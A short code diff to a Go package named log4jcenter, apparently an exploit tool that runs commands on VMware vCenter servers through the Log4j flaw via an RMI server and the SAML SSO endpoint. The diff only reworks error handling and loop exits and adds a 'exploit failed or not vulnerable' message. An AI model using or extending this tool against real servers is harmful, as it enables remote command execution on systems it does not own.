@@ -3,7 +3,6 @@ package log4jcenter
 import (
 	"crypto/tls"
 	"fmt"
-	"io"
 	"net"
 	"os"
 	"strings"
@@ -176,13 +175,17 @@ func exec_cmd(url, rmiserver, command, version string) (bool, string) {
 	// resp, err := client.R().
 	// 	SetHeaders(myheader).
 	// 	Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
-	if err != nil && err == io.ErrUnexpectedEOF {
+	// if err != nil && err == io.ErrUnexpectedEOF {
+	// 	//
+	// } else if strings.Contains(err.Error(), "NO_ERROR") {
+	// 	//
+	// } else {
+	// 	log.Fatal(err)
+	// 	// fmt.Println("[-] 连接失败，请检查网络.")
+	// 	// os.Exit(0)
+	// }
+	if err != nil {
 		//
-	} else if strings.Contains(err.Error(), "NO_ERROR") {
-		//
-	} else {
-		fmt.Println("[-] 连接失败，请检查网络.")
-		os.Exit(0)
 	}
 	if resp.StatusCode() == 200 {
 		result := resp.String()
@@ -204,14 +207,15 @@ func Execc(url, rmiserver, command string) {
 		temp1, temp2 := exec_cmd(url, rmiserver, command, "7")
 		if temp1 {
 			fmt.Println(temp2)
-			break
+			return
 		}
 		temp3, temp4 := exec_cmd(url, rmiserver, command, "6")
 		if temp3 {
 			fmt.Println(temp4)
-			break
+			return
 		}
 	}
+	fmt.Println("[-] 利用失败或不存在漏洞.")
 }
 
 func getIpAddr2(url string) string {
